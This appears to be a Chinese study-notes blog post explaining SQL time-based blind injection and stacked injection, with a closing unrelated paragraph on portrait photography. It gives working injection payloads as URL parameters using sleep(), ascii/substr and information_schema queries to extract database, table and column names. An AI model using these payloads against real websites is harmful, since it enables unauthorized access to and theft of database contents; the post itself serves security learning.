title: SQL时间注入&堆叠注入
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-03-12 23:11:00
---
### SQL时间注入
#### 表现
无论输入什么都会返回正常的处理信息或者页面无回显
能依靠自身感知到页面的延时情况

#### 原理
前端在将数据传给后台时，设置了一个if语句
当条件为真时执行sleep语句，条件为假时无执行语句

#### 思路
时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。
如果想要注入，必不可少的是得看得到效果。
那么有没有什么方法能直接或是间接地显示或猜解出数据呢？
当然有！前面就已近提到过函数这个东西了。
函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。
此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。

#### 相关函数讲解
```
if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回c
sleep(x)                 延时x秒
if(a,b,c)                a为真，执行b；否则执行c
benchmark(a,b)           a为操作次数，b为执行的函数
                         原理是通过多次操作，让极短暂的延时增加到能识别的程度
                         后面几个都是这种思想
笛卡尔积                  别问，老子离散数学还没学到这！
get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间
                         前提条件是数据库连接是长连接
正则bug                  利用大量正则计算延长时间，实现延时

除此之外还有
case … when … then … else … end
```

#### 开始注入
##### 判断是否存在注入点及注入的类型
```
?id=1
?id=5
?id=5'
?id=5"
?id=5 and 1=1
?id=5 and 1=2
```
如果页面显示结果一样，那就说明可能是延时注入

##### 获取库长度
```
?id=1 and if(length(database())<10,sleep(5),1)
?id=1 and if(length(database())=4,sleep(5),1)
```
如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4

##### 获取库名、表名、字段名及字段内容
```
爆数据库名
?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)
测试表数量
?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())<5
测试第一张表长度
?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))<10
测试表名
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<100
测试表中字段数量
?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5
测试字段内容
?id=1 and (select count(name) from users)=4
```
这时候你会发现这就是布尔盲注的做法
一个一个跑咯，懒得细细讲解了

### SQL堆叠注入
#### 表现
跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。

#### 原理
在SQL中，分号表示一条 sql 语句的结束。
在分号后继续构造下一条语句，就会把两条语句一起执行。
**联合注入**也是将两条语句合并在一起，两者之间有什么区别么？
union执行的语句类型是有限的，而堆叠注入可以执行任意语句。

#### 开始注入
##### 检查注入点及回显位
```
?id=1'
?id=1' and 1=1--+
?id=1' and 1=2--+
```

##### 获取数据
方法前面都有讲，回去抄payload就行了
加入分号，再接一个SQL语句看是否能显出结果。

### 每日一句
今天不讲一句，讲一段话。

**人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。
但是每个人不同的身高决定了站立时必定不能拍出完美的图片。
因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，
这样才能看见他们更多的表情、神态和动作。
你才能看到他们的世界，画面才会更有吸引力。**